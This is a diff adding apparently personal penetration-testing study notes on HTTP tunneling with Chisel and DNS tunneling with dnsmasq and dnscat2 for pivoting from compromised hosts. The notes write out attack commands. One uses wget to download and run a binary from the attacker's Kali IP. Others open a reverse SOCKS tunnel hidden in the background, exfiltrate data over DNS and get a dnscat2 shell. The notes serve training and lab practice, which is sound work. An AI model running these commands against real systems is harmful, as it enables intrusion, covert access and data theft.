@@ -1,0 +1,82 @@
+<h3 id="http-tunneling-theory-practice">HTTP Tunneling Theory/Practice</h3>
+<p><strong>HTTP Tunneling Fundamentals</strong></p>
+<ul>
+<li>Useful when all you have is egress HTTP traffic and no useful inbound ports</li>
+<li>We basically set up a server on kali and use egress traffic from the pwned machine to create an HTTP tunnel allowing inbound commands</li>
+<li><em>Chisel</em> is a good tool for encapsulating data within HTTP<ul>
+<li>Run a server on Kali, client on pwned machine with internal access<ul>
+<li>On Kali: <code>sudo apt install chisel</code>, then copy <code>/usr/bin/chisel</code> into <code>/var/www/html</code> and start apache to make the file available (or just use python???)</li>
+<li>Can view all traffic to this port with <code>sudo tcpdump -nvvvXi tun0 tcp port {port}</code></li>
+</ul>
+</li>
+<li><code>chisel server --port {port} --reverse</code> on kali to run the server</li>
+<li><code>wget {kali_ip}/chisel -O /tmp/chisel &amp;&amp; chmod +x /tmp/chisel</code> for running the Chisel client on the linux target<ul>
+<li><code>chisel client {kali_IP}:{kali_port} R:socks &gt; /dev/null 2&gt;&amp;1 &amp;</code></li>
+</ul>
+</li>
+<li>Then, pass commands with <code>ssh -o Proxycommand=&#39;ncat --proxy-type socks5 --proxy 127.0.0.1:{port_given_by_chisel_(1080)} %h %p&#39; {user}@{internal_IP_1hop}</code><ul>
+<li>Need to install <code>ncat</code> on kali first</li>
+</ul>
+</li>
+<li>Can also be used on Windows<ul>
+<li>From meterpreter, <code>upload chisel.exe C:\\Users\\{user}\\chisel.exe</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Can be combined with proxychains<ul>
+<li>Put the socks5 proxy port (from Chisel) in proxychains</li>
+</ul>
+</li>
+</ul>
+<h3 id="dns-tunneling-theory-practice">DNS Tunneling Theory/Practice</h3>
+<p><strong>DNS Tunneling Fundamentals</strong></p>
+<ul>
+<li>Register a name server that can communicate with all other nameservers</li>
+<li>Run <code>sudo dnsmasq -C dnsmasq.conf -d</code> on the pwned machine that other pwned machines refer to for dns info<ul>
+<li><code>dnsmasq.conf</code> needs to have <code>no-resolv</code>, <code>no-hosts</code>, <code>auth-zone=feline.corp</code>, and <code>auth-server=feline.corp</code> all on newlines</li>
+<li>-C uses a config file, and -d means no-daemon mode so we can kill it</li>
+</ul>
+</li>
+<li>On pwned machine, check DNS resolution with <code>resolvectl status</code><ul>
+<li>Can then run something like <code>nslookup -type=txt www.feline.corp</code>, as the 2nd pwned machine will look to the 1st for name records and return exfiltrated data</li>
+</ul>
+</li>
+<li>To view exfiltrated data on DNS server:<ul>
+<li><code>sudo tcpdump -i {network interface (like ens192)} udp port 53</code></li>
+<li><code>nslookup garbage.{owned_domain}</code> on pwned machine to test</li>
+</ul>
+</li>
+<li>Since everything needs to look up domains, it doesn&#39;t matter how deep the pwned machine is in the internal network</li>
+<li>Getting data back into the network:<ul>
+<li>Add TXT records to <code>dnsmasq.conf</code> with:<ul>
+<li><code>txt-record=www.{domain}, {arbitrary data here}</code></li>
+<li>Then restart the server (<code>sudo dnsmasq.conf -C dnsmasq.conf -d</code>)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>DNS Tunneling with dnscat2</strong></p>
+<ul>
+<li><code>dnscat2</code> runs on an authoritative name server for a domain on a pwned nameserver, queried by pwned machines</li>
+<li><code>dnscat2-server {domain}</code> to run, making it listen on all interfaces on udp port 53<ul>
+<li>Similar to above, the domain needs to be specified in <code>~/dns_tunneling/dnsmasq.conf</code></li>
+</ul>
+</li>
+<li>Then, on client, simply run <code>dnscat {domain}</code> to get a shell</li>
+<li>Tunneling:<ul>
+<li>Run <code>window -i 1</code> to be able to run commands in the window</li>
+<li>Once we have a shell, we can use the <code>listen</code> command to do a local port forward</li>
+<li><code>listen 127.0.0.1:{inbound_port} {internal_IP}:{desired_port}</code> <ul>
+<li>This listens on <code>inbound_port</code> on the loopback interface (e.g. only localhost)</li>
+<li>If we want to listen everywhere, just use <code>0.0.0.0</code></li>
+</ul>
+</li>
+<li>Then, use it by simply accessing the inbound port on kali localhost<ul>
+<li>Example: <code>nmap -p {inbound_port} localhost</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
